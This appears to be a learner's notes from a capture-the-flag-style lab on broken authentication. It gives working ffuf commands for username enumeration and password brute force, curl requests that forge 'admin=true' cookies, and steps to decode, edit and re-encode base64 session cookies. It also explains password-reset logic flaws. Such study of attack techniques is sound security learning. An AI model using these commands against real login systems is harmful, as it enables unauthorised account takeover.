# Broken Authentication

## What This Room Is About

Four authentication bypass techniques used against real web applications:
username enumeration, credential brute force, logic flaws, and cookie 
manipulation.

---

## Tools Used

- `ffuf` — username enumeration and credential brute forcing
- `curl` — manual cookie manipulation and request testing
- CrackStation (crackstation.net) — hash lookup for hashed cookies

---

## What I Learned

### 1. Username Enumeration

Applications that respond differently to registered vs unregistered usernames 
leak which accounts exist. Signup and password reset forms are the most 
common vectors — they return messages like "username already exists" for 
taken names.

```bash
ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt \
  -X POST \
  -d "username=FUZZ&email=x&password=x&cpassword=x" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -u http://TARGET_IP/customers/signup \
  -mr "username already exists"
```

`-mr` filters output to only responses containing that string — everything 
else is discarded. Output is a list of real accounts to feed into brute force.

---

### 2. Credential Brute Force

Pair every valid username against a password list. `ffuf` supports multiple 
wordlists using named markers (`W1`, `W2`) instead of the default `FUZZ`.

```bash
ffuf -w valid_usernames.txt:W1,/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 \
  -X POST \
  -d "username=W1&password=W2" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -u http://TARGET_IP/customers/login \
  -fc 200
```

`-fc 200` filters out all HTTP 200 responses (failed logins), leaving only 
the successful login visible. Works because failed logins return 200 and 
successful ones return a redirect.

---

### 3. Logic Flaws

Logic flaws don't require malformed input — they use valid input that drives 
the application through an unintended sequence. Password reset and account 
recovery workflows are the most common source because they split state across 
multiple HTTP parameters, cookies, and session variables.

The flaw: a mistake in how those inputs are combined can allow a reset link 
for one account to be delivered to a different address.

No tool needed — understanding the intended flow and finding where inputs 
aren't properly tied together is the skill.

---

### 4. Cookie Manipulation

HTTP is stateless — cookies carry authentication state between requests. 
If cookies aren't cryptographically signed, the client can edit them and 
the server has no way to detect the change.

**Plain Text Cookies**

Cookies stored as raw values with no signing:

```bash
# No cookies — returns "Not Logged In"
curl http://TARGET_IP/cookie-test

# Logged in as regular user
curl -H "Cookie: logged_in=true; admin=false" http://TARGET_IP/cookie-test

# Logged in as admin
curl -H "Cookie: logged_in=true; admin=true" http://TARGET_IP/cookie-test
```

**Hashed Cookies**

A hash is not a signature. For short or predictable values, pre-computed 
lookup tables break it immediately. If you find a hash in a cookie, run it 
through CrackStation before doing anything else.

Common hash outputs for the value `1`:

| Value | Algorithm | Hash |
|-------|-----------|------|
| 1 | MD5 | `c4ca4238a0b923820dcc509a6f75849b` |
| 1 | SHA-1 | `356a192b7913b04c54574d18c28d46e6395428ab` |
| 1 | SHA-256 | `6b86b273ff34fce19d6b804eff5a3f5747ada4eaa22f1d49c01e52ddb7875b4b` |

**Encoded Cookies (Base64)**

Encoding is reversible — it provides zero security. Base64 cookies often 
contain JSON objects with session data.

```bash
# Decode
echo "eyJpZCI6MSwiYWRtaW4iOmZhbHNlfQ==" | base64 -d
# Output: {"id":1,"admin":false}

# Edit and re-encode
echo '{"id":1,"admin":true}' | base64
# Substitute back into cookie
```

---

## Key Commands

```bash
# Username enumeration
ffuf -w usernames.txt -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -u http://TARGET_IP/customers/signup -mr "username already exists"

# Credential brute force
ffuf -w valid_usernames.txt:W1,passwords.txt:W2 -X POST \
  -d "username=W1&password=W2" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -u http://TARGET_IP/customers/login -fc 200

# Plain text cookie manipulation
curl -H "Cookie: logged_in=true; admin=true" http://TARGET_IP/cookie-test

# Decode base64 cookie
echo "COOKIE_VALUE" | base64 -d

# Re-encode modified cookie
echo '{"id":1,"admin":true}' | base64
```
